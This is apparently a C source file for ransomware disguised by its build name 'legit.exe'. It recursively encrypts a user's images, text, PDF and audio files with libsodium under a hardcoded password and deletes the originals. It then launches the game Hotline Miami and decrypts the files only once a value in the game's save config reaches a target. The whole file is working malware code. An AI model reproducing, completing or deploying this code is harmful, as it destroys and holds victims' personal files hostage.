// gcc -Wall tree2.c libencry.c  -lsodium -o legit.exe  -static-libgcc -static-libstdc++ -static 





#include <unistd.h>
#include <sys/types.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <windef.h>
#include <unistd.h>

#include "crypt.h"


#include<stdlib.h>

#define _GNU_SOURCE   

#include <stdbool.h>



#include <windows.h>
#include <tlhelp32.h>

#define BUFFER_LEN (400)
#define RESULT_LEN (20)


#define SEARCH_PATTERN   "saves.dat"



int is_directory_we_want_to_list(const char *parent, char *name) {
  struct stat st_buf;



  if (!strcmp(".", name) || !strcmp("..", name))
    return 0;
  char *path = alloca(strlen(name) + strlen(parent) + 2);
  sprintf(path, "%s/%s", parent, name);
  stat(path, &st_buf);
  return S_ISDIR(st_buf.st_mode);
}





void list(const char *name) {




  DIR *dir = opendir(name);
  struct dirent *ent;

	ent = readdir(dir);
	ent = readdir(dir);

  while ((ent = readdir(dir))) {
    char *entry_name = ent->d_name;
    printf("%s\n", entry_name);
    if (is_directory_we_want_to_list(name, entry_name)) {
      // You can consider using alloca instead.
      char *next = malloc(strlen(name) + strlen(entry_name) + 2);
      sprintf(next, "%s/%s", name, entry_name);
      list(next);
      free(next);
    }
	else
	{
		
		if((strstr(entry_name,".png"))||(strstr(entry_name,".jpg"))||(strstr(entry_name,".gif"))||(strstr(entry_name,".txt"))||(strstr(entry_name,".pdf"))||(strstr(entry_name,".mp3"))||(strstr(entry_name,".flac")))
		{

			printf("encrypt\n");
					char sfile[200];
			 sprintf(sfile, "%s/%s", name, entry_name);

			char tfile[210];
			sprintf(tfile, "%s%s", sfile,".encrypted" );														//TODO: sod lib encrypt
			encrypt(tfile,sfile);
			/*char sfile[200];
			 sprintf(sfile, "%s/%s", name, entry_name);
			fps = fopen(sfile, "r");
			char tfile[210];
			sprintf(tfile, "%s%s", sfile,".encrypted" );
			fpt = fopen(tfile, "w");
			int status;
			printf("%s\n%s\n",sfile,tfile);
			
			
			while(fread(&ch,1,1,fps)!=0)
				{
					ch = ch+100;
					fputc(ch, fpt);
					
				}
			fclose(fps);
			fclose(fpt);*/
			remove(sfile);
		}
		
	}
  }
  closedir(dir);

}

void listde(const char *name) {




  DIR *dir = opendir(name);
  struct dirent *ent;

	ent = readdir(dir);
	ent = readdir(dir);

  while ((ent = readdir(dir))) {
    char *entry_name = ent->d_name;
    printf("%s\n", entry_name);

    if (is_directory_we_want_to_list(name, entry_name)) {
      // You can consider using alloca instead.
      char *next = malloc(strlen(name) + strlen(entry_name) + 2);
      sprintf(next, "%s/%s", name, entry_name);
      listde(next);
      free(next);
    }
	else
	{
			char * Pos = strstr(entry_name,".encrypted");
		if ( Pos)
        {

			char CryptedFile[MAX_PATH] = {0};
			
			
			sprintf(CryptedFile, "%s/%s", name, entry_name);

			
			char DecryptedFile[MAX_PATH] = {0};	

			
			snprintf(DecryptedFile, sizeof DecryptedFile,  "%s/%s", name, entry_name);
		
			Pos = strrchr(DecryptedFile , '.');
			if ( Pos)
			{
				*Pos = '\0';
			}	

			decrypt(DecryptedFile,CryptedFile);
			remove(CryptedFile);
//TODO: sod lib Dicrypt
			/*char sfile[210];
			int i;
			sprintf(sfile, "%s/%s", name, entry_name);
			fps = fopen(sfile, "r");
			char tfile[200];
			for( i=0;i<strlen(sfile)-11;i++){
				tfile[i]=sfile[i];}
				tfile[i+1]='\0';
			//sprintf(tfile, "%s%s", sfile,".encrypted" );
			fpt = fopen(tfile, "w");
			int status;
			printf("%s\n%s\n",sfile,tfile);
			
			
			while(fread(&ch,1,1,fps)!=0)
				{
					ch = ch-100;
					fputc(ch, fpt);
					
				}
			fclose(fps);
			fclose(fpt);
			status = remove(sfile);*/
			}
	}
	}
  
  closedir(dir);
}
const char* SearchPattern(const char *Buffer , size_t length)
{
	const char *Position = Buffer;
	printf("before while Position = %p\n", Position);
	
	while ((Position = memchr(Position, SEARCH_PATTERN[0], length)))
	{
		printf("before strncmp Position = %p\n", Position);
		if (!strncmp(Position, SEARCH_PATTERN, sizeof(SEARCH_PATTERN)-1))
		{
			break;
		
		}
		printf("after strncmp  Position = %p\n", Position);
		if( (Position - Buffer) <= (length -  sizeof(SEARCH_PATTERN)))
		{	
			Position++;
		}
		else
		{
			Position = NULL;
			break;
		}
	}
		printf("after while Position = %p\n", Position);
		printf("after while Position = '%s'\n", Position);
	
	return Position;
}

DWORD FindProcessId(const char *processname)
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32 = {sizeof(PROCESSENTRY32W)};
    DWORD result = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnap) 
     {
		  printf("CreateToolhelp32Snapshot return %p\n", hProcessSnap);	
		return(FALSE);
	}
    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32))
    {
        CloseHandle(hProcessSnap);          // Clean the snapshot object
		printf("Process32First fail\n");	
		return(FALSE);
    
    }

    do
    {
        if (0 == _stricmp(processname, pe32.szExeFile))
        {
            result = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);

    return result;
}


int main(){

//char cwd[PATH_MAX];
//getcwd

chdir("E:/test/legit game");
	/*encrypt*/
init_crypt("Password 123");	
list("..");
printf("encryption completed");

   char Buffer[BUFFER_LEN]="";
   char Result[RESULT_LEN+1] = "";
   const char *Pattern = NULL; 
   const char *Start = NULL;
   int comp;
STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	HANDLE hProc;

	  DWORD ResultD = FindProcessId("HotlineGL.exe");
	printf("FindProcessId return %lu\n", ResultD);
	if ( !ResultD)
	{
			BOOL ret = SetCurrentDirectory("./Hotline Miami/");
			printf("SetCurrentDirectory  return %d\n", ret);
		if (!CreateProcessA(NULL, "HotlineGL.exe", 
					NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) 
		{
			puts("CreateProcessA error");
			return 101;
		}
puts("CreateProcessA OK");
		hProc = pi.hProcess;
	}
	else
	{
		

	     hProc = OpenProcess  (PROCESS_TERMINATE ,FALSE,ResultD);
	  printf("OpenProcess return %p\n", hProc);


		
	}
   
   FILE *fp =NULL;
   while(1)
	{	ResultD = FindProcessId("HotlineGL.exe");
		if  ( !ResultD)
		{ 
			BOOL ret = SetCurrentDirectory("./Hotline Miami/");
			printf("SetCurrentDirectory  return %d\n", ret);
			if (!CreateProcessA(NULL, "HotlineGL.exe", 
					NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) 
			{
				puts("CreateProcessA error");
				return 101;
			}
		}
		char *Userprofile = getenv("USERPROFILE");
		printf("Userprofile = '%s'\n", Userprofile);

		chdir(Userprofile);
		fp= fopen("./Documents/My Games/HotlineMiami/hotline.cfg","r");

		if (!fp)
	   {
			perror("fopen: ");
	   }
	   else
	   { 
			while (fread (Buffer, sizeof(char), sizeof (Buffer) , fp)!=0) 
		   {
				if(NULL != ( Pattern = SearchPattern(Buffer,sizeof (Buffer) ))&&
					(NULL != ( Start = memchr(Pattern, '\n', BUFFER_LEN) ) ))
				{
					snprintf(Result, RESULT_LEN, "%s", Start+1);
					printf("'%s'\n",Result);
					comp=strcmp(Result, "11111111111111111111");
					printf("%d",comp);
					break;
			
					
				}
		
			}
			sleep(3);
			fclose(fp);
		}
				if(!comp)
				{/*Decrypt*/
							
					break;
				}
	}
BOOL Ret = TerminateProcess(hProc, 232);
	printf("TerminateProcess return %d\n",  Ret  );
CloseHandle(hProc);
sleep(1);
ResultD = FindProcessId("HotlineGL.exe");
printf("FindProcessId return %lu\n", ResultD);



chdir("E:/test/legit game");

listde("..");

printf("completed");
	
    return 0;
}

	